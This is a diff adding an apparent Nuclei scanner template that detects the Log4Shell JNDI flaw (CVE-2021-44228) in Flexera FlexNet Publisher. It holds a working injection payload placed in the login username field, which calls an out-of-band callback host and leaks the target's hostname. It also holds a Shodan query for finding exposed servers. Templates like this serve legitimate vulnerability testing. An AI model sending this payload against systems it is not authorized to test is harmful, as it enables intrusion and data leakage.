@@ -1,0 +1,67 @@
+id: flexnet-log4j-rce
+
+info:
+  name: Flexnet - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    Flexnet is susceptible to Log4j JNDI remote code execution.
+  reference:
+    - https://community.flexera.com/t5/Revenera-Company-News/Security-Advisory-Log4j-Java-Vulnerability-CVE-2021-4104-CVE/ba-p/216905
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:flexera:flexnet_publisher:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    shodan-query: title:"Flexnet"
+    product: flexnet_publisher
+    vendor: flexera
+  tags: cve,cve2021,rce,jndi,log4j,flexnet,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /flexnet/logon.do HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/flexnet/logon.do
+        Content-Type: application/x-www-form-urlencoded
+
+        action=logon&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}&domain=FLEXnet
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
+# digest: 490a00463044022057f65ae9fc25b09412adda58e9da54424187de07774d38a9c212deb2aa428af2022073c32455e472b40cc6bf99ab648e83315ad881e3566179bfc4e3630c82ecf745:922c64590222798bb761d5b6d8e72950
